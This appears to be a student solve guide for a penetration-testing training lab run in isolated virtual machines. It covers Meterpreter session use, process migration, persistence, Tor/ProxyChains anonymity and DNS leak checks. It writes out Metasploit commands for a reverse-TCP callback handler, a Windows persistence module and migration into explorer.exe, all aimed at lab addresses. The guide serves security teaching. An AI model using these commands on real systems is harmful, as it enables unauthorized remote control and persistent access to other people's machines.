# Lab 2 Student Solution Guide

This document is the practical solve guide for the Meterpreter and Anonymity lab in spec.md.
Use this only in your isolated training environment.

## 1. Readiness Check Before Solving

The repository build artifacts are complete, but your lab is ready to solve only after runtime checks pass in both VMs.

### Kali readiness

1. Boot Kali VM.
2. From the project folder, run:
   chmod +x build/kali/setup_kali_lab2.sh validate_lab2.sh
   ./build/kali/setup_kali_lab2.sh
   ~/validate_lab2.sh
3. Confirm all checks show PASS.

### Windows readiness

1. Boot Windows VM and sign in as Administrator.
2. Open elevated PowerShell and run:
   Set-ExecutionPolicy Bypass -Scope Process -Force
   .\setup_windows_lab2.ps1 -VulnOption A
   Restart-Computer
3. After reboot, open elevated PowerShell and run:
   .\check_windows_lab2.ps1
4. Confirm all checks show PASS.

### Network readiness

1. Kali host-only IP must be 192.168.56.100.
2. Windows host-only IP must be 192.168.56.150.
3. Verify both machines can reach each other.

If all three readiness areas pass, start solving.

## 2. Solve Part 1: Meterpreter Session Management

Goal:
Establish Meterpreter access, inspect host/session context, and perform process migration safely.

### Step-by-step

1. Start msfconsole on Kali.
2. Prepare a listener using the provided resource script:
   msfconsole -r ~/lab2_listener.rc
3. Use your selected initial access route from the lab spec and obtain a Meterpreter session.
4. Interact with the session:
   sessions -i <session_id>
5. Gather baseline data:
   sysinfo
   getuid
   ps
6. Identify a stable migration target process, usually explorer.exe for user context.
7. Perform migration:
   migrate <explorer_pid>
8. Confirm migration:
   getpid
   getuid

### Pass criteria

1. You get an active Meterpreter session.
2. sysinfo and getuid return expected values.
3. ps lists many processes.
4. Migration succeeds and session remains alive.

## 3. Solve Part 2: Maintaining Access (Persistence)

Goal:
Create persistence and verify callback after reboot.

### Step-by-step

1. In msfconsole, set up persistence module:
   use exploit/windows/local/persistence
   show options
2. Configure mandatory options, for example:
   set SESSION <session_id>
   set LHOST 192.168.56.100
   set LPORT 4445
3. Execute the module:
   run
4. Set up callback handler for persistence port:
   use exploit/multi/handler
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 192.168.56.100
   set LPORT 4445
   set ExitOnSession false
   exploit -j -z
5. Reboot the Windows target.
6. Monitor sessions and confirm callback appears.

### Pass criteria

1. Persistence module completes without error.
2. Handler receives a session on the persistence port.
3. Session returns after target reboot.

## 4. Solve Part 3: Tor and ProxyChains Anonymity

Goal:
Route traffic through Tor and validate proxy behavior.

### Step-by-step

1. On Kali, verify Tor service:
   systemctl status tor
2. Verify Tor SOCKS endpoint:
   curl --socks5 127.0.0.1:9050 ifconfig.me
3. Confirm ProxyChains configuration:
   grep "^dynamic_chain" /etc/proxychains4.conf
   grep "^proxy_dns" /etc/proxychains4.conf
4. Launch a browser through ProxyChains:
   proxychains4 firefox
5. Browse to Tor check page and verify traffic is recognized as Tor routed.

### Pass criteria

1. Tor is active.
2. SOCKS proxy responds.
3. ProxyChains has dynamic_chain and proxy_dns enabled.
4. Browser traffic is routed through Tor when launched with proxychains4.

## 5. Solve Part 4: DNS Leak Analysis in Wireshark

Goal:
Observe DNS behavior with and without proxy_dns and explain the difference.

### Step-by-step

1. Start Wireshark on Kali.
2. Select the host-only interface.
3. Apply display filter:
   udp.port == 53
4. With proxy_dns enabled, run:
   proxychains4 nslookup google.com
5. Observe capture and record whether local UDP 53 queries appear.
6. Temporarily disable proxy_dns in /etc/proxychains4.conf.
7. Repeat:
   proxychains4 nslookup google.com
8. Observe capture again and compare with previous run.
9. Re-enable proxy_dns after test.

### Pass criteria

1. You can capture DNS traffic in Wireshark.
2. You can demonstrate a no-leak style test with proxy_dns enabled.
3. You can demonstrate leak behavior when proxy_dns is disabled.
4. You can explain why proxy DNS forwarding reduces local resolver leakage.

## 6. Full Validation Checklist

Use this as your final self-check.

### Session management

1. Initial access obtained.
2. sysinfo works.
3. getuid works.
4. ps works.
5. migrate succeeds.
6. Session survives migration.

### Persistence

1. Persistence module runs.
2. Callback handler catches reconnect.
3. Reboot survives.

### Anonymity

1. Tor service active.
2. SOCKS works.
3. ProxyChains config correct.
4. Browser through proxychains4 works.

### DNS analysis

1. DNS packets visible in Wireshark.
2. proxy_dns enabled test shows reduced local DNS leakage.
3. proxy_dns disabled test shows leak behavior.

If everything above passes, you have solved the lab objectives.

## 7. Common Failure Points

1. Wrong interface selected in Wireshark.
2. Incorrect LHOST value in payload or handler.
3. Host-only network misconfigured.
4. Tor not running or invalid torrc syntax.
5. Assuming SMBv1 alone guarantees MS17-010 exploitability.

## 8. Optional Evidence Collection for Your Notes

Keep simple notes for each objective:

1. Command executed.
2. Key output snippet.
3. Result status as PASS or FAIL.
4. Fix applied if it failed.

This makes retesting from snapshot much faster.
